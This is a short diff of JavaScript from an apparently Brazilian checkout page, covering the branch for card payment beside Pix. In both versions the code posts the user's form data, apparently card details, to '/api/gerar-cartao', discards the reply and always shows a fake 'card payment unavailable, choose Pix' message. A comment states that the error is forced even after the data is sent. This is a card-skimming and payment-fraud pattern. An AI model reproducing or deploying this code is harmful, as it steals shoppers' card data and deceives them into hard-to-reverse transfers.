@@ -253,20 +253,21 @@
         } catch (error) {
           alert('Erro de rede ao gerar Pix.');
         }
-   } else if (tipoSelecionado === 'cartao') {
-  try {
-    const response = await fetch('/api/gerar-cartao', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(dados)
-    });
 
-    // Ignora a resposta, apenas mostra erro
-    alert('Pagamento com cartão indisponível. Por favor, escolha a opção Pix.');
-  } catch (error) {
-    alert('Erro ao processar o cartão. Por favor, escolha a opção Pix.');
-  }
-}
+      } else if (tipoSelecionado === 'cartao') {
+        try {
+          const response = await fetch('/api/gerar-cartao', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(dados)
+          });
+
+          // Aqui força o erro mesmo após envio
+          alert('Pagamento com cartão indisponível. Por favor, escolha a opção Pix.');
+        } catch (error) {
+          alert('Erro ao processar o cartão. Por favor, escolha a opção Pix.');
+        }
+
       } else {
         alert('Selecione uma forma de pagamento.');
       }
